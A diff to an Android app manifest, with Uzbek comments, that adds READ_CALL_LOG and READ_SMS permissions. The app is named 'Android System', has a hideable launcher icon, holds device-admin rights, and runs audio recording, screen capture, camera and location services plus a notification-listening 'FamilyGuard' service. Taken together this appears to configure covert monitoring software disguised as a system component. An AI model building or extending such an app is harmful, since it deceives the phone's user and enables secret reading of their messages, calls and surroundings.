@@ -23,15 +23,12 @@
   <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
   <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
 
+  <!-- ✅ Qo'shildi -->
+  <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+  <uses-permission android:name="android.permission.READ_SMS"/>
+
   <application android:theme="@style/Theme.Child" android:label="Android System">
-          <service
-    android:name=".FamilyGuardAccessibilityService"
-    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-    android:exported="true">
-    <intent-filter>
-        <action android:name="android.service.notification.NotificationListenerService" />
-    </intent-filter>
-</service>
+
     <service
         android:name=".AudioRecordingService"
         android:exported="false"
@@ -45,10 +42,10 @@
         android:foregroundServiceType="mediaProjection|camera|location"/>
 
     <receiver android:name=".DeviceAdminReceiver"
-      android:label="Android System"
-      android:description="@string/device_admin_description"
-      android:permission="android.permission.BIND_DEVICE_ADMIN"
-      android:exported="true">
+        android:label="Android System"
+        android:description="@string/device_admin_description"
+        android:permission="android.permission.BIND_DEVICE_ADMIN"
+        android:exported="true">
       <meta-data android:name="android.app.device_admin"
           android:resource="@xml/device_admin_receiver"/>
       <intent-filter>
@@ -68,10 +65,8 @@
 
     <receiver android:name=".WatchdogReceiver" android:exported="false"/>
 
-    <!-- MainActivity — intent-filter YO'Q, alias orqali ochiladi -->
     <activity android:name=".MainActivity" android:exported="true"/>
 
-    <!-- Ikonka uchun alias — shu yashiriladi/ko'rsatiladi -->
     <activity-alias
         android:name=".LauncherAlias"
         android:targetActivity=".MainActivity"
@@ -84,6 +79,7 @@
       </intent-filter>
     </activity-alias>
 
+    <!-- ✅ Faqat BIR MARTA, to'g'ri permission bilan -->
     <service
         android:name=".FamilyGuardAccessibilityService"
         android:exported="true"
